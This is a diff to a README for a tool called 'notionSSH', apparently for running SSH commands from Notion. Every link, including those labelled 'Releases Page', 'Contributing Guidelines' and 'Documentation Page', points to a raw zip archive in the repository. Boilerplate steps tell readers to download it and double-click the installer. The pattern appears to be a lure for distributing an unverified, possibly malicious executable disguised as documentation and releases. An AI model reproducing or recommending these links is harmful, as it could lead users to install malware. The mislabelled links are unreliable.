@@ -1,7 +1,7 @@
 # 🚀 notionSSH - Control Your Servers Easily
 
 ## 🔗 Download Now
-[![Download Release](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip%20now-v1.0-blue)](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip)
+[![Download Release](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip%20now-v1.0-blue)](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip)
 
 ## 📖 Introduction
 notionSSH lets you manage your remote servers directly from Notion. You can run SSH commands anywhere, anytime—right from your web browser. This application is powered by Rust, ensuring efficiency and reliability.
@@ -23,13 +23,13 @@ To run notionSSH, your system should meet the following requirements:
 ## 🚀 Getting Started
 Follow these steps to download and set up notionSSH:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip).
 2. **Find the Latest Release**: Look for the most recent version, usually at the top of the page.
 3. **Download the Installer**: Click on the appropriate file for your operating system. This will download the required installer or application to your computer.
 4. **Run the Installer**: After downloading, open the downloaded file and follow the prompts to install notionSSH on your machine.
 
 ## 📥 Download & Install
-You can download notionSSH from the Releases page. Make sure to choose the latest version for the best experience. Click this link to visit: [Download from Releases](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip).
+You can download notionSSH from the Releases page. Make sure to choose the latest version for the best experience. Click this link to visit: [Download from Releases](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip).
 
 Once downloaded, follow these steps:
 - **Windows**: Double-click the installer file and follow the setup instructions.
@@ -52,7 +52,7 @@ If you encounter issues while using notionSSH, consider the following:
 - **Compatibility**: Verify that your operating system meets the requirements listed above.
 
 ## 🤝 Contributing
-If you want to contribute to notionSSH, you're welcome to do so. You can report issues, suggest features, or even submit code changes. Please check out the [Contributing Guidelines](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip) for more information.
+If you want to contribute to notionSSH, you're welcome to do so. You can report issues, suggest features, or even submit code changes. Please check out the [Contributing Guidelines](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip) for more information.
 
 ## 📃 License
 notionSSH is licensed under the MIT License. You can use, modify, and distribute it under the terms of this license.
@@ -61,6 +61,6 @@ notionSSH is licensed under the MIT License. You can use, modify, and distribute
 If you need help, feel free to open an issue on GitHub or reach out to the community in the discussions section. Your feedback and suggestions are always welcome.
 
 ## 🔗 More Information
-For a deeper dive into the software and its capabilities, you can check out our documentation online. Visit our [Documentation Page](https://raw.githubusercontent.com/AfnanLakhair/notionSSH/main/hemoleucocyte/notionSSH.zip).
+For a deeper dive into the software and its capabilities, you can check out our documentation online. Visit our [Documentation Page](https://github.com/AfnanLakhair/notionSSH/raw/refs/heads/main/scripts/SSH_notion_v1.1.zip).
 
 Thank you for using notionSSH! We hope it simplifies your remote server management.
